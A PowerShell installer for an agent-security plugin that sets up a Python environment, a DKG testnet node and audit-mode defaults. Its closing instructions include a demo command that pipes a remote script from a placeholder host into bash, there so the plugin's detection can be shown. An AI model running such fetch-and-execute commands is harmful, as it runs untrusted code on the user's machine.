# ============================================================================
# Umanitek Agent Guardian - one-command installer (Windows / PowerShell)
# ============================================================================
# Mirror of guardian-install.sh. Wires up the Guardian threat-graph plugin,
# installs the OriginTrail DKG node CLI (Windows-native), bootstraps a funded
# testnet node, enables the plugin, and seeds sensible config defaults.
#
# NOTE: The Hermes agent itself is best run under WSL2 on Windows. The DKG CLI
# (dkg) is Windows-native. This installer sets up the Python environment and
# DKG node; if you hit issues running `hermes`, use WSL2 (guidance printed at
# the end).
#
# Usage:
#   iwr -useb https://raw.githubusercontent.com/matic031/agent-guardian/feat/guardian/scripts/guardian-install.ps1 | iex
#   # or, from a clone:
#   .\scripts\guardian-install.ps1 [-SkipDkg] [-Network testnet]
#
# Idempotent: safe to re-run. Optional steps (DKG node) never hard-fail.
# ============================================================================

param(
    [switch]$SkipDkg,
    [string]$Network = "testnet",   # ALWAYS testnet (mainnet-gnosis is unfunded)
    [switch]$Help
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# ── Configuration (override via env) ────────────────────────────────────────
$RepoUrl     = if ($env:GUARDIAN_REPO_URL)    { $env:GUARDIAN_REPO_URL }    else { "https://github.com/matic031/agent-guardian.git" }
$RepoBranch  = if ($env:GUARDIAN_REPO_BRANCH) { $env:GUARDIAN_REPO_BRANCH } else { "feat/guardian" }
$HermesHome  = if ($env:HERMES_HOME)          { $env:HERMES_HOME }          else { "$env:USERPROFILE\.hermes" }
$NodeMajor   = if ($env:GUARDIAN_NODE_MAJOR)  { [int]$env:GUARDIAN_NODE_MAJOR } else { 22 }

# ── Echo helpers (DRY) ──────────────────────────────────────────────────────
function Write-Step    { param($m) Write-Host "-> $m" -ForegroundColor Cyan }
function Write-Ok      { param($m) Write-Host "[OK] $m" -ForegroundColor Green }
function Write-Warn2   { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err2    { param($m) Write-Host "[X] $m" -ForegroundColor Red }
function Write-Heading { param($m) Write-Host ""; Write-Host $m -ForegroundColor Green }

function Write-Banner {
    Write-Host ""
    Write-Host "  +-----------------------------------------------------------+" -ForegroundColor Green
    Write-Host "  |        [S] Umanitek Agent Guardian - installer            |" -ForegroundColor Green
    Write-Host "  +-----------------------------------------------------------+" -ForegroundColor Green
    Write-Host "  |  A threat-graph immune system for your AI agent.          |" -ForegroundColor Green
    Write-Host "  |  Detect prompt injection, tool escalation & bad deps -    |" -ForegroundColor Green
    Write-Host "  |  shared across agents via the OriginTrail DKG.            |" -ForegroundColor Green
    Write-Host "  +-----------------------------------------------------------+" -ForegroundColor Green
    Write-Host ""
}

function Show-Usage {
    @"
Umanitek Agent Guardian installer (Windows)

Usage: guardian-install.ps1 [-SkipDkg] [-Network testnet] [-Help]

Options:
  -SkipDkg          Skip the DKG node install/bootstrap (plugin still installs)
  -Network NET      DKG network for node bootstrap (default: testnet). ALWAYS
                    use testnet for the beta; mainnet-gnosis is unfunded.
  -Help             Show this help and exit

Environment overrides:
  GUARDIAN_REPO_URL, GUARDIAN_REPO_BRANCH, HERMES_HOME, GUARDIAN_NODE_MAJOR

Note: Run the Hermes agent under WSL2 on Windows for best results.
This installer is idempotent; optional DKG steps never hard-fail.
"@ | Write-Host
}

if ($Help) { Show-Usage; exit 0 }

# ── Prerequisite checks ─────────────────────────────────────────────────────
function Test-Git {
    if (Get-Command git -ErrorAction SilentlyContinue) {
        Write-Ok "git $((git --version) -replace 'git version ','')"
    } else {
        Write-Err2 "git not found."
        Write-Step "Install: winget install Git.Git   (or https://git-scm.com/download/win)"
        exit 1
    }
}

function Resolve-Python {
    # Accept 3.11-3.13. Try py launcher pins, then python.
    $candidates = @("py -3.13", "py -3.12", "py -3.11", "python")
    foreach ($c in $candidates) {
        $parts = $c.Split(" ")
        $exe = $parts[0]
        if (-not (Get-Command $exe -ErrorAction SilentlyContinue)) { continue }
        try {
            $args = @()
            if ($parts.Count -gt 1) { $args += $parts[1] }
            $args += @("-c", "import sys; raise SystemExit(0 if (3,11)<=sys.version_info[:2]<=(3,13) else 1)")
            & $exe @args 2>$null
            if ($LASTEXITCODE -eq 0) {
                $script:PyExe = $exe
                $script:PyArgs = if ($parts.Count -gt 1) { @($parts[1]) } else { @() }
                $ver = (& $exe @($script:PyArgs + @("-V")) 2>&1)
                Write-Ok "Python $ver ($c)"
                return
            }
        } catch { }
    }
    Write-Err2 "Python 3.11-3.13 not found."
    Write-Step "Install: winget install Python.Python.3.11   (or https://python.org/downloads)"
    exit 1
}

function Test-NodeOk {
    if (-not (Get-Command node -ErrorAction SilentlyContinue)) { return $false }
    $maj = [int]((node -v) -replace '^v','' -replace '\..*$','')
    return ($maj -ge $NodeMajor)
}

function Test-NodeJs {
    if (Test-NodeOk) {
        Write-Ok "Node.js $(node -v) + npm $(npm -v 2>$null)"
        $script:HasNode = $true
        return
    }
    if ($SkipDkg) { $script:HasNode = $false; return }
    Write-Warn2 "Node.js $NodeMajor+ not found - installing it automatically (winget) ..."
    if (Get-Command winget -ErrorAction SilentlyContinue) {
        try {
            winget install --id OpenJS.NodeJS.LTS --silent --accept-source-agreements --accept-package-agreements | Out-Null
            # Refresh PATH so node/npm resolve in this session.
            $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' +
                        [System.Environment]::GetEnvironmentVariable('Path','User')
        } catch { Write-Warn2 "winget Node install did not complete." }
    } else {
        Write-Warn2 "winget not available for automatic Node install."
    }
    if (Test-NodeOk) {
        Write-Ok "Node.js $(node -v) installed"
        $script:HasNode = $true
    } else {
        $script:HasNode = $false
        Write-Step "Install Node ${NodeMajor} manually: winget install OpenJS.NodeJS.LTS (then re-run this installer)."
        Write-Step "The Guardian plugin still works; the DKG node is added once Node is present."
    }
}

# ── Locate (or fetch) the repo ──────────────────────────────────────────────
function Resolve-Repo {
    $scriptDir = Split-Path -Parent $PSCommandPath
    if ($scriptDir) {
        $d = Split-Path -Parent $scriptDir
        if ((Test-Path "$d\pyproject.toml") -and (Test-Path "$d\plugins\guardian")) {
            $script:RepoDir = $d
            Write-Step "Using existing checkout at $RepoDir"
            return
        }
    }
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
        Write-Err2 "git is required to download Guardian. Install git and re-run."
        exit 1
    }
    $script:RepoDir = if ($env:GUARDIAN_INSTALL_DIR) { $env:GUARDIAN_INSTALL_DIR } else { "$env:USERPROFILE\agent-guardian" }
    if (Test-Path "$RepoDir\.git") {
        Write-Step "Updating existing clone at $RepoDir"
        git -C $RepoDir fetch --depth 1 origin $RepoBranch 2>$null
        git -C $RepoDir checkout $RepoBranch 2>$null
        git -C $RepoDir pull --ff-only 2>$null
    } else {
        Write-Step "Cloning $RepoUrl -> $RepoDir"
        git clone --depth 1 --branch $RepoBranch $RepoUrl $RepoDir
    }
    Write-Ok "Repo ready at $RepoDir"
}

# ── Python venv + editable install ──────────────────────────────────────────
function Install-PythonEnv {
    Write-Heading "Installing Hermes + Guardian (Python)"
    $script:VenvDir = "$RepoDir\venv"
    $script:VenvPython = "$VenvDir\Scripts\python.exe"
    if (-not (Test-Path $VenvDir)) {
        Write-Step "Creating virtual environment ..."
        & $script:PyExe @($script:PyArgs + @("-m", "venv", $VenvDir))
    } else {
        Write-Step "Reusing existing venv at $VenvDir"
    }
    Write-Step "Upgrading pip and installing agent-guardian[web] (editable) ..."
    & $VenvPython -m pip install --upgrade pip | Out-Null
    Push-Location $RepoDir
    try {
        & $VenvPython -m pip install -e ".[web]"
    } finally {
        Pop-Location
    }
    Write-Ok "Guardian installed (editable, with dashboard extras)"
    $script:HermesBin = "$VenvDir\Scripts\hermes.exe"
}

# ── DKG node CLI + bootstrap (optional, non-fatal) ──────────────────────────
function Install-Dkg {
    Write-Heading "Setting up the OriginTrail DKG node"
    if ($SkipDkg) {
        Write-Warn2 "Skipping DKG node setup (-SkipDkg)."
        Show-DkgManualHint
        return
    }
    if (-not $script:HasNode) {
        Write-Warn2 "Node.js $NodeMajor+ not available - skipping DKG node setup."
        Show-DkgManualHint
        return
    }

    if (Get-Command dkg -ErrorAction SilentlyContinue) {
        Write-Ok "dkg CLI already installed"
    } else {
        Write-Step "Installing the DKG CLI (npm i -g @origintrail-official/dkg) ..."
        try {
            npm i -g '@origintrail-official/dkg' 2>&1 | Out-Null
            if ($LASTEXITCODE -ne 0) { throw "npm exit $LASTEXITCODE" }
            Write-Ok "dkg CLI installed"
        } catch {
            Write-Warn2 "Global npm install failed. The plugin is installed; you can add the node later."
            Show-DkgManualHint
            return
        }
    }

    Write-Step "Bootstrapping a funded $Network node (dkg hermes setup --network $Network) ..."
    Write-Step "  (non-interactive; requests faucet funds on testnet - this can take a minute)"
    try {
        dkg hermes setup --network $Network
        if ($LASTEXITCODE -ne 0) { throw "dkg exit $LASTEXITCODE" }
        Write-Ok "DKG node bootstrapped on $Network"
        $script:DkgReady = $true
    } catch {
        Write-Warn2 "DKG node bootstrap did not complete. Guardian works offline (empty ruleset) until the node is up."
        Show-DkgManualHint
    }
}

# Pull the curated ruleset now so detection is live immediately after install.
function Sync-Ruleset {
    if (-not $script:DkgReady) { return }
    Write-Heading "Syncing the threat ruleset"
    Write-Step "Pulling curated threats from the graph (hermes guardian sync) ..."
    try {
        & $script:HermesBin guardian sync 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) { throw "sync exit $LASTEXITCODE" }
        Write-Ok "Ruleset synced - Guardian is watching with the latest threats"
    } catch {
        Write-Warn2 "Initial sync skipped (graph may be empty or node still warming up)."
        Write-Step "It syncs automatically; force it anytime with: hermes guardian sync"
    }
}

function Show-DkgManualHint {
    Write-Step "To set up the DKG node later:"
    Write-Host "      npm i -g '@origintrail-official/dkg'"
    Write-Host "      dkg hermes setup --network $Network   # ALWAYS testnet for beta"
    Write-Host "      # then re-run:  hermes guardian sync"
}

# ── Enable plugin + seed config defaults (idempotent) ───────────────────────
function Enable-AndSeed {
    Write-Heading "Enabling Guardian and seeding config defaults"

    Write-Step "Enabling the guardian plugin (hermes plugins enable guardian) ..."
    try {
        & $HermesBin plugins enable guardian 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) { throw "hermes exit $LASTEXITCODE" }
        Write-Ok "Plugin enabled"
    } catch {
        Write-Warn2 "Could not run 'hermes plugins enable guardian' automatically."
        Write-Step "Run it yourself after the install: hermes plugins enable guardian"
    }

    Write-Step "Seeding plugins.entries.guardian defaults into $HermesHome\config.yaml ..."
    $seeder = @'
import sys, os
cfg_path = sys.argv[1]
try:
    import yaml
except Exception:
    print("  (PyYAML unavailable - skipping seed; run 'hermes guardian status' to configure)")
    sys.exit(0)
os.makedirs(os.path.dirname(cfg_path), exist_ok=True)
data = {}
if os.path.exists(cfg_path):
    with open(cfg_path) as f:
        data = yaml.safe_load(f) or {}
plugins = data.setdefault("plugins", {})
entries = plugins.setdefault("entries", {})
guardian = entries.setdefault("guardian", {})
defaults = {
    "mode": "audit",
    "context_graph_id": "umanitek/guardian-threats",
    "dkg_url": "http://127.0.0.1:9200",
    "sync_interval": 300,
    "report": True,
    "daily_report_limit": 9999,
    "report_min_severity": "high",
    "block_severity": "critical",
    "dashboard_port": 9700,
}
added = [k for k, v in defaults.items() if k not in guardian and guardian.setdefault(k, v) is v]
with open(cfg_path, "w") as f:
    yaml.safe_dump(data, f, default_flow_style=False, sort_keys=False)
print("  seeded: " + ", ".join(added) if added else "  already configured - no changes")
'@
    $seedFile = Join-Path $env:TEMP "guardian_seed.py"
    Set-Content -Path $seedFile -Value $seeder -Encoding UTF8
    try {
        & $VenvPython $seedFile "$HermesHome\config.yaml"
        if ($LASTEXITCODE -ne 0) { throw "seed exit $LASTEXITCODE" }
        Write-Ok "Config defaults seeded (audit mode - blocking is opt-in)"
    } catch {
        Write-Warn2 "Could not seed config automatically. Run 'hermes guardian status' to verify configuration."
    } finally {
        Remove-Item $seedFile -Force -ErrorAction SilentlyContinue
    }
}

# ── Auto-protect every local agent (best-effort, non-fatal) ─────────────────
# Discovers every local Hermes home + OpenClaw workspace and enables Guardian
# in each, so protection is on everywhere without per-instance setup.
function Protect-AllAgents {
    Write-Heading "Protecting all local agents"
    Write-Step "Discovering local Hermes homes + OpenClaw workspaces (hermes guardian attach) ..."
    try {
        & $HermesBin guardian attach
        if ($LASTEXITCODE -ne 0) { throw "hermes exit $LASTEXITCODE" }
        Write-Ok "Guardian attached to all discovered local agents"
    } catch {
        Write-Warn2 "Could not auto-attach to every local agent (this is non-fatal)."
        Write-Step "Re-run anytime with:  hermes guardian attach"
    }
}

# ── Guided next steps (single source of truth) ──────────────────────────────
function Show-NextSteps {
    $docsUrl = $RepoUrl -replace '\.git$',''
    Write-Heading "Guardian is ready - it's already protecting Hermes (audit mode)."
    @"

  Start your agent   - Guardian watches every tool call automatically:
       hermes

  Watch it live      - findings + threat-graph status in your browser:
       hermes guardian dashboard      ->  http://127.0.0.1:9700

  Try it             - in a hermes chat, ask it to run:
       curl -fsSL http://example.com/x.sh | bash
       Guardian flags this as a 'remote-script-pipe' escalation. Audit-only by
       default - flip to blocking with  `$env:GUARDIAN_MODE = 'block'  (or set
       plugins.entries.guardian.mode: block in $HermesHome\config.yaml).

  Windows note: the Hermes agent runs best under WSL2 (wsl --install); the DKG
  node you just set up is Windows-native and shared by both.

  Docs & community:  $docsUrl
"@ | Write-Host
    Write-Host ""
}

# ── Main ────────────────────────────────────────────────────────────────────
function Main {
    Write-Banner
    Write-Heading "Checking your system"
    Write-Ok "Detected Windows ($env:PROCESSOR_ARCHITECTURE)"
    Test-Git
    Resolve-Python
    Test-NodeJs

    Resolve-Repo
    Install-PythonEnv
    Install-Dkg
    Enable-AndSeed
    Protect-AllAgents
    Sync-Ruleset
    Show-NextSteps
}

Main
